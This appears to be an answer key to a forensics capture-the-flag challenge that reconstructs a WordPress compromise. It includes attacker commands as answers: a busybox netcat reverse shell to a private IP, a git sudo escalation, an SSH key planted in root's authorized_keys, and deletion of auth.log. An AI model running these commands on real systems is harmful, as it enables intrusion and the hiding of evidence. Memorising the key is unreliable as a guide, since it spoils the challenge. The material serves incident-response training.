# Hacked V2

1. What ports are open on the machine?

Answer: `22,9100`

2. On port 9100, what CMS is the victim running?

Answer: `WordPress`

3. At what time did the threat actor perform directory fuzzing?

Answer: `07-08-2025 02:57:29`

4. What CVE was used by the threat actor to exploit the website?

Answer: `CVE-2025-4578`

5. At what time did the threat actor successfully log in to the website?

Answer: `07-08-2025 03:04:40`

6. The threat actor created a new user on the website. What is the username and password?

Answer: `anonymous:anonymous`

7. To which file did the threat actor plant a backdoor?

Answer: `preload.php`

8.  What key and IV were used by the threat actor?

Answer: `mysecretkey12345:1234567890abcdef`

9.  What was the first command executed by the threat actor?

Answer: `whoami`

10. After getting reverse shell, the threat actor downloaded a specific file. What file was downloaded, and what was the filename?

Answer: `LinPEAS;l.sh`

11. After that, which username did the threat actor log in as?

Answer: `hr`

12. What is the hash of the old hr password, and when was the password changed?

Answer: `$y$j9T$ciWl7C5r.v.3KEioPHNAM0$jyUYvD/1HmS79zuOMmYg4SW1hF8jNPoaI315By4k4Q3;07-08-2025 03:27:54`

13. What file/binary was used to perform privilege escalation?

Answer: `/usr/local/bin/compress`

14. What command was executed to perform privilege escalation?

Answer: `busybox nc 192.168.56.102 3131 -e sh`

15.  What user account did the attacker gain access to, and when did the privilege escalation occur?

Answer: `programmer;07-08-2025 03:30:01`

16. What file/binary was used to perform privilege escalation?

Answer: `/usr/bin/git`

17. What command was executed to perform privilege escalation?

Answer: `sudo -u sysadmin git help config`

18.  What user account did the attacker gain access to, and when did the privilege escalation occur?

Answer: `sysadmin;07-08-2025 03:36:32`

19.  What file/binary was used to perform privilege escalation?

Answer: `/usr/lib/x86_64-linux-gnu/security/pam_unix.so`

20. What user account did the attacker gain access to, and when did the privilege escalation occur?

Answer: `root;07-08-2025 03:42:56`

21. What is the absolute path to the malicious payload planted by the attacker?

Answer: `/usr/local/lib/.libwrite.so`

22. Which file was modified by the planted payload, and what content was injected?

Answer: `/root/.ssh/authorized_keys;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILIsUqYcMlLoHPQr795NQdzSIINRjNZizGUoGFH5+oMQ kali@kali`

23. What C2 was used by the threat actor?

Answer: `TrevorC2`

24.  What key was used by the threat actor on the C2 server?

Answer: `AFE123jDJ3xamvmplei33@afew`

25.  What was the last command executed by the threat actor via the C2?

Answer: `rm /var/log/auth.log`

# References:

- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#old-passwords-in-etcsecurityopasswd
- https://medium.com/@althubianymalek/linux-privilege-escalation-using-tar-wildcards-a-step-by-step-guide-55771aae063f
- https://gtfobins.github.io/gtfobins/git/
- https://github.com/gsmith257-cyber/RandomTools/blob/b81d696ea4ddaafd045acd94ecc07302946d2c6d/trevorC2Decrypt.py